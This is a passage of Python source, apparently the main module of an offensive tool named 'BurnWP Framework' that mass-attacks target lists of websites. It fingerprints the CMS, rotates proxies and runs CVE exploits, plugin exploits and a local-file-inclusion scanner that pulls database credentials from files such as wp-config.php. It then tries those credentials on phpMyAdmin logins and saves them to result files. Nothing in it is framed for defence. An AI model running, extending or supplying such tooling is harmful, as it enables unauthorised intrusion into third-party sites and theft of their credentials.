            # Plugin_Manager.Target = self.TARGET
            # Plugin_Manager.WPNonce = self.WPNonce
            # Plugin_Manager.Proxies = self.Proxies_ON
            # Plugin_Manager.Sess = self.Sessions
            # Plugin_Manager.User_Agent = self.UA_
            # Plugin_Manager.Cfg_Technologia = self.CFG_SystemPlugin

            Plugin_Manager.Run_Plugin(self.TARGET, self.Proxies_ON, self.WPNonce, self.Sessions, self.UA_, self.PLUGIN_CONTROL_SYSTEM, self.FOUND_CMS)

        except:pass# Exception as e:
            #Core_Helper.Printed_Value.Log_Error("Error External_Plugin Function :",str(e))

def Scan_Plugin(Target): #From Plugin Manager
    # print(Target)
    try:
        if CFG_PROXIES_OFFON:
            checker.MAN_THREADER()
        try:
            proxy_cycles = itertools.cycle(HQ_PROXIES) if HQ_PROXIES else None
        except Exception:
            proxy_cycles = None

        PROXIES = Rotate_Proxies(proxy_cycles)    

        P_SESS = requests.Session()
        
        
        PRO_TARGET, FOUND_CMS, WPNONCE = Runner_CMSID(Target, PROXIES) 
       
        if FOUND_CMS:
            return PRO_TARGET, WPNONCE, P_SESS, PROXIES, FOUND_CMS
        
        return None, None, None, None, None
    except:
        return None, None, None, None, None




def Runner_CMSID(domain, Proxies):
    try:
        TARGET = domain
        TAR_PRO, WHATISCMS, Sec_Code = Modules_CMS.DetectCMS_Class(TARGET, 5, NO_USED, NO_USED, NO_USED, Proxies, CFG_DETECT_MULTI_CMS, Config_UA).CMS_Run()
        # print(TAR_PRO, WHATISCMS, Sec_Code)
        
        if WHATISCMS == 'Unknown_ID':
            if TAR_PRO:
                Core_Helper.Printed_Value.Log_Fail(
                    TAR_PRO, f'[CMS:{WHATISCMS}]')
                Saved_Result(r'DB_Results\Domain_Technology\Unknown_ID.txt', f'{TAR_PRO}\n')
            
            return TAR_PRO, 'Unknown_ID', False 
        
        if WHATISCMS in ['WORDPRESS-XMLRPC', 'WORDPRESS']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'WORDPRESS', Sec_Code
        
        if WHATISCMS in ['JOOMLA']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'JOOMLA', Sec_Code
        
        if WHATISCMS in ['DRUPAL']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'DRUPAL', Sec_Code
        
        if WHATISCMS in ['OPENCART']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'OPENCART', Sec_Code

        if WHATISCMS in ['APACHE']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'APACHE', Sec_Code
        
        if WHATISCMS in ['PHP']:
            Core_Helper.Printed_Value.Found_CMS(TAR_PRO, f'[CMS:{WHATISCMS}]')
            return TAR_PRO, 'PHP', Sec_Code


        return None, None, None
    except:
        return None, None, None
    
def MASS_LFI(tar_url, paths, max_workers, stop_on_first=True, Proxies_ON=NO_USED, FOUND_CMS=NO_USED):
    try:    
        Found_res = False
        args = [(tar_url, path, Proxies_ON, Config_UA) for path in paths] 
        

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(LFI_Scanner.LFI_Tasker, *arg): arg[1]
                for arg in args


            }

            for future in as_completed(futures):
                try:
                    
                    LFI_Results = future.result()
                    if LFI_Results:
                        if LFI_Results and len(LFI_Results) >= 5:
                            DB_NAME, PMA_USER, PMA_PASSWD, PMA_HOST, vuln_path = LFI_Results
                            #DB_NAME, DB_USER, DB_PASSWD, DB_HOST = ('xxx_wordpress', 'xxx', 'Q+xxx^YH]xxx', 'localhost', 'wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php') \
                            
                            Core_Helper.Printed_Value.Log_Success(tar_url, f"[LFI] {LFI_Results[4]}")
                            TARGET_URL = urljoin(tar_url, vuln_path)
                            
                            Saved_Result(r"DB_Results\Result_LFI.txt", f"\nLFI Vuln: {TARGET_URL}\n"
                                                        f"DB_Name: {DB_NAME}\n"
                                                        f"DB_User: {PMA_USER}\n"
                                                        f"DB_Passwd: {PMA_PASSWD}\n"
                                                        f"DB_Host: {PMA_HOST}\n"
                                                        f"*****************************************\n")
                            if CFG_PHPMYADMIN_CHECKER:
                                PMA_Sessions = requests.Session() 
                            
                                PMA_Mod = PMA.PhpMyAdminLogin_OkorNOT(f'{tar_url}/phpmyadmin/',
                                    PMA_USER,
                                    PMA_PASSWD, PMA_Sessions, Proxies_ON, Config_UA)
                                    

                                if PMA_Mod.PMA_LOGATTACK:
                                    Core_Helper.Printed_Value.Log_Success(tar_url, f"[PMA] PhpMyAdmin | PMA Accessed") 
                                    Saved_Result(r"DB_Results\PhpMyAdmin_Logged.txt", f"PMA: {TARGET_URL}\nPMA_User: {PMA_USER}\nPMA_Pass: {PMA_PASSWD}\n************************************\n")

                                else:
                                    Core_Helper.Printed_Value.Log_Fail(tar_url, f"[PMA] PhpMyAdmin | Failed") 
                            Found_res = True
                            #print(Found_res)
                            if stop_on_first:  
                                break
                except Exception as er:
                    Core_Helper.Printed_Value.Log_Error("Error Scan_LFI :", str(er))
                
        return Found_res
    
    except Exception as e:
        Core_Helper.Printed_Value.Log_Error("Error Scan_LFI :", str(e))

def Boss_Scanner(target, per_proxy):
    try:
        WPNonce_FOUND = None
        PROXIES = Rotate_Proxies(per_proxy)

        
        PRO_TARGET, WHATSWEB, WPNonce_SEC = Runner_CMSID(target, PROXIES)  
        if not WPNonce_SEC:
            WPNonce_SEC = WPNonce_FOUND

        
        if not PRO_TARGET:
            return
        
        
        
    
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as task_executor:
            
            futures = []  

            if CFG_CVE_EXPLOITER:
                futures.append(task_executor.submit(CVE_Exploiter(PRO_TARGET, PROXIES, WPNonce_SEC, Config_UA, WHATSWEB).Exploit_TASK))

            if CFG_LFI_SCANNER:
                futures.append(task_executor.submit(MASS_LFI, PRO_TARGET, ListWP_Vuln, 8, True, PROXIES, WHATSWEB))

            if CFG_PLUGIN_OFFON:
                futures.append(task_executor.submit(Plugin_Exploiter(PRO_TARGET, PROXIES, WPNonce_SEC, Config_UA, PLUGIN_CONTROL_SYSTEM, WHATSWEB).External_Plugin))

            for future in as_completed(futures):
                future.result()

    except:
        pass 

#Proxy_INF 
# HQ_PROXIES = []
# BAD_PROXIES = []
# MARK_GOOD = set()
# MARK_BAD = set()

def Brain_Bot(targets):
    try:
        if CFG_PROXIES_OFFON:
            checker.MAN_THREADER()
        
        try:
            proxy_cycles = itertools.cycle(HQ_PROXIES) if HQ_PROXIES else None
        except Exception:
            proxy_cycles = None
                
        
        #Proxies_ON = Rotate_Proxies(proxy_cycle)
        #print('Proxy Runing => ', Proxies_ON)
        
        
        # with open(attack_filelist, 'r', encoding='utf-8') as f:
        #     target_list = f.read().splitlines()
        # target_list = ['xxxx.com.au']
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(Boss_Scanner, target, proxy_cycles) for target in targets]
            for future in as_completed(futures):
                future.result()
    except Exception as er:
        Core_Helper.Printed_Value.Log_Error("Error Brain_Bot :", str(er))  

def main():
    Burnning(Screen)     
    Listen_Commander()    


def Listen_Commander():
    
    Infom_Tables.About_US()
    parser = argparse.ArgumentParser(
        description=f"\n\n[+]{YELLOW} Warning: Before running, check features on/off to ensure they work as expected.{RESET}\n\n",
                                        
        epilog=" [ Example ] \n"
               f" ***********  python3 {sys.argv[0]} --attack targets.txt\n" \
               f" ***********  python3 {sys.argv[0]} list_plugin --list targets.txt\n" \
               f" ***********  python3 {sys.argv[0]} list_plugin --target http://evil_host.com\n" \
               f" ***********  python3 {sys.argv[0]} install_plugin\n" \
               f" ***********  python3 {sys.argv[0]} ui_config\n" \
               f" ***********  python3 {sys.argv[0]} cve_info\n",
               
               
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")
    #command : attack
    attack_parser = subparsers.add_parser(
        "attack",
        help="Run Mass-Attack with your Target_list (*.txt)"
    )
    #py main.py attack -h
    attack_parser.description = "[*] Launch mass attack on targets from a list (*.txt), using CVE Exploiter, LFI, and Plugin Exploiter as configured."
    attack_parser.add_argument(
        "target_file", 
        help="Give-ME : Target_list (*.txt) to scan with CVE, LFI, Plugin Exploiter"
    )
    
    #command :  list_plugin 
    list_parser = subparsers.add_parser(
        "list_plugin",
        help="Show & Choose Plugins Domain or Multi-Targets (*.txt)"
    )
    list_parser.description = "[*] Display available plugins and run with your Target Single Domain (URL) or Multi-Targets from a (*.txt) file."
    list_parser.add_argument(
        "--target",
        help="Give-ME : Target with Domain ex: http://evil_host.com"
    )
    list_parser.add_argument(
        "--list",
        help="Give-ME : Multi-Target with File (Bulk) *.txt"
    )

    #command : install_plugin 
    install_parser = subparsers.add_parser(
        "install_plugin",
        help="Powerful Drag to Folder Plugin_Exploiter with Real-Time Tracking DEBUG"
    )
    install_parser.description = "[*] Install new plugins into the system with powerful tracking of Valid, Error, Deleted, and Modified Plugins."


    cve_info_parser = subparsers.add_parser(
        "cve_info",
        help="Show-ME : CVE Details was Added in BurnWP Framework 1.0"
    )
    cve_info_parser.description = "[*] Show CVE list with detailed exploit information included in the BurnWP Framework"

    ui_config = subparsers.add_parser(
        "ui_config",
        help="UI (User-Interface) Easy to Config Settings"
    )
    ui_config.description = "[*] UI Config is help you Disable (OFF) or Enable (ON) Any Technology You Want"
     
    try:
        args = parser.parse_args()

        if args.command == "install_plugin":
            Plugin_Manager.Persistenced_Plugin()
            #manager.Run_plugin()
            Plugin_Manager.Printed_MSG()
            Plugin_Manager.Plugin_Watcher()
            

        elif args.command == "list_plugin":
            
            if args.target:
                
                Plugin_Manager.Plugin_Selected([args.target], Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS) 

            elif args.list:

                if not os.path.exists(args.list):
                    Core_Helper.Printed_Value.Log_Error("Retry Check Target .txt not found", f"{args.list}")
                    return
                with open(args.list, encoding='utf-8') as file_txt:
                    targets = [line.strip() for line in file_txt if line.strip()]
                
                Plugin_Manager.Plugin_Selected(targets, Config_UA, PLUGIN_CONTROL_SYSTEM, MAX_THREADS)
            
            else:
                Core_Helper.Printed_Value.Log_Info("You need use", "--target or --list.")
                #print("[x] You must provide --target or --list.")
        
        elif args.command == "attack":
            target_files = args.target_file
            if not target_files or not os.path.exists(target_files):
                #print(f"[x] File not found: {target_files}")
                Core_Helper.Printed_Value.Log_Error("Retry Check Target .txt not found", f"{target_files}")
                return
            try:
                #print(args.attack)
                with open(target_files, encoding='utf-8') as file_txt:
                    target_lists = [line.strip() for line in file_txt if line.strip()]
            except:
                pass 
                
            Brain_Bot(target_lists)
        elif args.command == "cve_info":
            #print("\n[+] CVE Information from Plugins (READ CSV)\n" + "-"*50)
            Infom_Tables.CVE__DB()
        elif args.command == "ui_config":
            if os.name == 'nt':
                try:
                    UI_SetupConfig.UI_Frame()
                except:
                    Core_Helper.Printed_Value.Log_Error("Modify Settings with Folder", "GO Config/config.json and Make Config OFF(False) or ON(True) ")

    except:
        Infom_Tables.Help_Tables()


if __name__ == "__main__":
    main()
    
    
    #Scan_('http://localhost/wordpress', None)
   # main()
#CVE_Exploiter(TARGET).Exploit_TASK()
#CVE_Exploiter(TARGET)#.External_Plugin()
